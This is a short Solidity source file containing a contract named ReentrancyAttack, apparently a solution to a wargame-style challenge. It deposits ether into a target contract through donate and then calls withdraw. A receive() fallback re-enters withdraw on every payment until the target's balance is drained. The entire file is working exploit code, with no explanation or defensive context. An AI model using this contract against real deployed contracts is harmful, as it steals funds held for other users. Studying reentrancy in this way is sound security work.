// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ReentrancyAttack {
    IReentracy reentrancyContract;
    uint256 initialAmount;

    constructor(address _reentrancyContract) {
        reentrancyContract = IReentracy(_reentrancyContract);
    }

    function Attack() external payable {
        initialAmount = msg.value;
        reentrancyContract.donate{value: initialAmount}(address(this));
        reentrancyContract.withdraw(initialAmount);
    }

    receive() external payable {
        uint256 balance = address(reentrancyContract).balance;
        uint256 amount = balance >= initialAmount ? initialAmount : balance;
        if (balance > 0) {
            reentrancyContract.withdraw(amount);
        }
    }
}

interface IReentracy {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}
